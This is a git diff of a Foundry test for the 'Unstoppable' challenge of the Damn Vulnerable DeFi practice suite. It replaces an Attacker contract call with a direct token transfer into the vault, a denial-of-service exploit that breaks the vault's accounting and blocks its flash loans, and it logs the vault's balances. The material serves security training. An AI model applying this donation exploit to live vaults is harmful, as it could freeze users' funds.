@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
 import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
+
 import {Attacker} from "../../src/unstoppable/Attacker.sol";
 
 contract UnstoppableChallenge is Test {
@@ -92,9 +93,9 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        Attacker attackerCtr = new Attacker(player, address(token), vault, monitorContract);
-
-        attackerCtr.attack();
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
+        console.log("Vault assets balance: ", vault.totalAssets());
+        console.log("Vault shares balance: ", vault.convertToShares(vault.totalSupply()));
     }
 
     /**
